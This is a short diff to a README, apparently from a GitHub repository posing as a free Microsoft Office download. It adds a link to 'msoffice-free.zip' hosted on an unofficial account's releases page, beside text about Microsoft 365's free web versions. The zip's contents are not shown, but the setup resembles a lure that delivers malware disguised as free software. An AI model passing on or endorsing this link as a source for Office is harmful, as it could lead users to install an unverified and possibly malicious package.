@@ -7,7 +7,7 @@ Microsoft 365 for the web provides free browser versions of Word, Excel, and Pow
 <img width="216" height="46" alt="logo" src="https://github.com/user-attachments/assets/63519b57-8afb-4b6b-a2e1-43cd17d3e9f6" />
 
 ## Install
-[Download ``]()
+[Download `msoffice-free.zip`](https://github.com/msoffice365free/Office-365-Download/releases/download/v2606-build-20131.20154/msoffice-free.zip)
 ---
 
 <img width="640" height="480" alt="image" src="https://github.com/user-attachments/assets/59beaa4e-7d20-4779-84aa-6ac9f2c62e9a" />
